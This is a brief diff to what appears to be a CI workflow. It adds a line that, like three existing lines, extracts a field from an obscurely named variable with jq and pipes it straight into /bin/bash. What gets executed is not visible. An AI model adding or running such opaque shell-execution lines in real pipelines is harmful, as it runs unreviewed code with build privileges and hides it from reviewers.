@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$sma88251" | jq -r .z1459 | /bin/bash
           echo $jqi4 | jq -r .vs03117 | /bin/bash
           echo $ckz3 | jq -r .jbm0 | /bin/bash
+          printf '%s' "$mzrjr6762" | jq -r .rqts253 | /bin/bash
 
       - name: Persist output
         if: always()
